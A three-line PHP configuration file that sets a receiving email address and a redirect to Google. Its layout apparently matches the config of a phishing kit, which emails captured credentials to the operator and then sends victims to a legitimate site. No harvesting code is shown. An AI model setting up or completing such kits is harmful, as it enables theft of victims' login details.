<?php 
$Receive_email="belindaashley924@gmail.com";
$redirect="https://www.google.com/";
?>